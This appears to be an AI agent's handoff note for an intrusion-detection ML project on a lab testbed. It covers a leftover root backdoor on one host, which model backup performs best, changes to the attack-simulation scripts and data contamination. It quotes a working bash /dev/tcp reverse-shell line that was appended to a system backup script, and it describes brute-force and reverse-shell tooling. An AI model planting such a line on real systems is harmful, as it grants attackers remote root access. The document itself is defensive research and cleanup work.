# TAD→PETA Handoff — 2026-09-08

Read this top-to-bottom before doing anything. Section 1 is urgent; the rest is context for continuing the ML work.

---

## 1. URGENT — unresolved security issue on host 204

**10.163.1.204 has a live, working root backdoor, and it has NOT been confirmed cleaned.**

- Originally injected during earlier testing: a line was appended to `/usr/local/bin/system_backup.sh` on 204 that opens a reverse shell to kali (10.163.1.105) port 4444: `/bin/bash -c 'bash -i >& /dev/tcp/10.163.1.105/4444 0>&1'`.
- It kept beaconing out long after its own test run ended, contaminating later data-collection runs (confirmed in run5 and run7 — see §4).
- **On 2026-09-08, this was confirmed to be a live, fully-interactive ROOT shell, not just a passive beacon.** While testing `cronattack2.py --target 10.163.1.123 --force-shell` (a new flag that opens a listener and accepts *any* incoming connection, not just from the intended target), 204's backdoor connected in and returned real command output: `root@CCM-Manager:~#`, `ip addr` showing `10.163.1.204/24` with real Docker/veth interfaces, real `ps aux` output. This is a genuine, currently-exploitable root-level exposure on the testbed, independent of the ML project.

**Action needed (not yet confirmed done):**
```bash
ssh 10.163.1.204 "sudo ps aux | grep -E '4444|dev/tcp'"      # find the resident process
ssh 10.163.1.204 "sudo kill <pid>"                            # kill it
ssh 10.163.1.204 "sudo crontab -l"                             # check if it's set to respawn
ssh 10.163.1.204 "sudo sed -i '/dev\/tcp\/10.163.1.105\/4444/d' /usr/local/bin/system_backup.sh"
```
Re-run the `ps aux` check after — it must show nothing. **Do not run any `cronattack2.py --force-shell` capture again until this is confirmed dead**, or it will catch 204 again instead of the intended target.

The raw capture/metrics from that `--force-shell` test run **live on the kali host itself**, not in this dev environment — they have not been pulled or analyzed here. Do not label or merge them; they're 204 traffic mislabeled as 123.

---

## 2. ML model status — READ THE ROLLBACK PATH CAREFULLY, it was stated wrong earlier in this project's chat history

Five versions of `hgb_newdataset_5class.joblib` exist in `TAD/models/multiclass/`, all with **different content** (verified via md5sum):

| File | Created | What it is | Known metrics |
|---|---|---|---|
| `backup-20260908-112413/` | Aug 24 (pre-session) | Old baseline | — |
| `backup-20260908-124347/` | Sep 8, 11:27 | Prior session's retrain | — |
| `backup-20260908-133023/` | Sep 8, 12:46 | Model live **before** the run4+5+6 relabel retrain | — |
| `backup-20260908-175839/` | Sep 8, 13:33 | **★ BEST KNOWN MODEL — see below** | bal-acc **0.971**, macro-F1 **0.900**, post_exploitation precision 0.43 / recall 0.88 / F1 0.58 |
| `hgb_newdataset_5class.joblib` (live, on disk now) | Sep 8, 18:03 | Retrain with run7 added — **worse, do not deploy** | bal-acc 0.840, macro-F1 0.824, post_exploitation precision 0.26 / recall 0.31 |

**Correction:** earlier in this session I twice told the user the "good" backup was `backup-20260908-133023`. That's wrong — I mixed up which backup was taken *before* which retrain. The actual best-performing model (0.971 bal-acc, produced from cleaned run4+5+6 data) is preserved at **`backup-20260908-175839/`**, because that backup was taken right before the *next* (worse) retrain overwrote it.

**If you want the best model back in production:**
```bash
cp /home/sdt/TAD_PETA/TAD/models/multiclass/backup-20260908-175839/*.joblib \
   /home/sdt/TAD_PETA/TAD/models/multiclass/
```
Then restart `./run_all.sh` to load it. **The pipeline has not been restarted all session** — whatever was running before this session started is still what's live; none of these retrains have been deployed.

Why run7's retrain made things worse: run7 added zero post_exploitation samples (target 123 has no backdoor, so that phase never ran), yet it still shifted the train/test split, and with only ~874 total post_exploitation examples the metrics on that class are essentially noisy at this sample size — this is a **data volume problem**, not something more relabeling will fix.

---

## 3. Scripts modified this session

All under `/home/sdt/TAD_PETA/data_collection/`:

**`label_capture.py`**
- Removed `ssh_connection` from `PHASE_LABELS` (it's just the ~3s SSH login handshake, indistinguishable from benign SSH — was contaminating post_exploitation with pure noise).
- Added `--stale-ports` (default off) — force-relabels traffic on a given port to benign; used with `--stale-ports 4444` when regenerating run5's labels to strip out 204's backdoor beacon.
- Added a "stray attacker traffic" warning: prints when the attacker IP talks to any host **outside** every declared time window — this is exactly the signature of a leftover beacon like 204's, and would have flagged it automatically. Already validated against run7 (correctly flagged 204 at 2,354 stray packets).

**`cronattack2.py`**
- `--target` is now **required**, no default. It used to default to `10.163.1.126`, and forgetting the flag silently attacked 126 instead of the intended host — this is exactly what happened to "run5" (intended 118, actually hit 126). Now it hard-errors instead.
- Added `--skip-recon` — skips nmap_scan + hydra_bruteforce, jumps straight to the ssh_connection/reverse-shell chain (saves ~16 min/run once a target already has good recon data).
- Added `--force-shell` — skips the real SSH-based injection attempt (which only works against 204, the one host with the `ccm-dev` account prepared) and treats `injected=True` unconditionally, to be paired with manually running `revshell_sim.py` on a target so it dials in on its own.
  - **Known flaw, not yet fixed**: the reverse-shell listener accepts a connection from *anyone*, not just `--target`. This is what let 204's backdoor hijack a `--target 123` run (see §1). **Next step**: add a check in `ReverseShellHandler`/`wait_for_connection` that verifies the connecting peer IP matches `SSH_TARGET`, rejecting/logging anything else.

**Not modified:** `WP5Sniffer3.py`, `benign_traffic.py`, `revshell_sim.py`, `retrain.py`, `train_newdataset_model.py`.

---

## 4. Data collection state

Raw captures + metrics on this dev box (`data_collection/`):

| Run | Target | What's clean | Known contamination |
|---|---|---|---|
| run4 | 126 | nmap, hydra, stress | — |
| run5 | intended 118, actually hit 126 | nmap, hydra, stress | 421 packets of 204's backdoor beacon in the "interactive_shell" window — filtered out via `--stale-ports 4444` when relabelled as `labelled2_v2.csv` |
| run6 | 123 (via default, before `--target` was made required) | nmap, hydra, stress | — |
| run7 | 123 (confirmed via traffic forensics: 8,034 kali↔123 packets in the hydra window vs 4,730 residual 126 generator noise) | nmap, hydra, stress — **first genuinely diverse victim** | ssh_connection correctly failed auth (123 has no `ccm-dev` account) → no post_exploitation data, as expected |
| (unlabelled) `--force-shell` test on 123 | N/A | — | 204's live backdoor answered instead — see §1. Lives on kali host, not pulled here. |

Labelled files: `labelled1_v2.csv` (run4), `labelled2_v2.csv` (run5, backdoor-filtered), `labelled3_v2.csv` (run6), `labelled4.csv` (run7). These four + the base dataset are what's baked into both the good (`backup-175839`) and bad (`live`) models above. Old `labelled1/2/3.csv` (pre-fix, still contain the `ssh_connection`-as-attack mislabeling) are stale — don't reuse them.

Total post_exploitation samples across everything: **874** (752 from these 4 runs + 122 from the original base dataset's own old-taxonomy rows). This is the bottleneck — not label quality anymore, but volume.

---

## 5. Why post_exploitation is still weak (root cause, confirmed via forensics)

- `reverse_shell_setup` / `reverse_shell_wait` / `reconnaissance_commands` phases run in **~0 seconds** on every single run — they're structurally dead unless the target already has a real backdoor (only 204 has ever had one).
- The only phase that produces genuine "interactive shell" traffic shape is `interactive_shell`, and across 3 runs it only had real duration twice: 710s in run5 (later found to be 204's contamination, now filtered out) and 39s in run6.
- **This can only be fixed by generating real interactive-shell traffic on a target that isn't 204** — that's what `revshell_sim.py` is for (a safe traffic simulator: dials out to kali:4444, exchanges canned fake output, never executes real commands). It has never actually been deployed/run on a target yet.

---

## 6. Next steps, in priority order

1. **Confirm 204's backdoor is actually killed** (§1) — blocks everything else safely proceeding.
2. **Fix `--force-shell`'s peer-IP check** so it only accepts a connection from `--target`, not anyone (§3) — needed before trying `--force-shell` again.
3. **Deploy `revshell_sim.py` on a fresh target** (not 204) and run `cronattack2.py --target <ip> --skip-recon --force-shell` to finally get clean, attributable post_exploitation volume.
4. **Keep rotating `--target`** across untested hosts (204 once cleaned, 118, 111, 125) — 123 and 126 now have good coverage for nmap/hydra/stress.
5. Once there's meaningfully more post_exploitation volume (thousands, not hundreds), retrain and re-check — don't expect labeling tweaks alone to move that class further, it's data-starved.
6. Optional/lower priority: move `benign_traffic.py` off the attacker host (kali) to stop relying on the `--benign-ports` filter workaround.

---

## 7. Model choice context (for reference, already decided — don't revisit without new information)

- **HGB (HistGradientBoostingClassifier) stays as the classifier.** Confirmed against two papers read this session (GNN-IDS, ARES 2024; GraphIDS self-supervised, NeurIPS 2025) — both are binary/anomaly detectors, not 5-class classifiers, so neither replaces HGB for PETA's "which attack is this" decision.
- post_exploitation's weakness matches a documented failure mode in both papers (GraphIDS's *Infiltration* class has the same "looks like benign traffic" problem) — confirms this is a fundamentally hard class needing more data, not a wrong model choice.
- A self-supervised anomaly-detection layer (autoencoder/isolation forest on existing per-flow features) remains a reasonable future addition for catching zero-days HGB structurally can't see — not started, not urgent.
